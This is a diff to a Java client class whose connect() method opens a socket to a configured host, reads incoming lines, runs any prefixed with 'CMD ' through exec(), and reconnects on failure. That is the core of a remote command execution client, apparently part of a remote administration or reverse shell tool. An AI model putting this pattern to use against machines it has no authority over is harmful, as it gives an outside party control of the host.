@@ -29,24 +29,21 @@ public class Client {
     }
 
     private void connect() throws InterruptedException {
-        try{
+        try {
             Socket socket = new Socket(getHOST(), getPORT());
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            out = new PrintWriter(socket.getOutputStream(),true);
+            out = new PrintWriter(socket.getOutputStream(), true);
             System.out.println("Client started: " + getHOST() + ":" + getPORT());
             String comm;
-            if(socket.isConnected()) {
-                while((comm = in.readLine())!=null && !comm.contains("forciblyclose")) {
-                    comm = in.readLine();
-                    if (comm.contains("CMD ")) {
-                        exec(comm.replace("CMD ", ""));
-                    }
-                    if (comm.equals("forciblyclose")) {
-                        out.println("forciblyclose");
-                    }
+            while ((comm = in.readLine()) != null && !comm.contains("forciblyclose")) {
+                comm = in.readLine();
+                if (comm.contains("CMD ")) {
+                    System.out.println(comm);
+                    exec(comm.replace("CMD ", ""));
                 }
-            } else {
-                connect();
+                if (comm.equals("forciblyclose")) {
+                    out.println("forciblyclose");
+                }
             }
         } catch (IOException e) {
             System.out.println("Disconnected... retrying.");
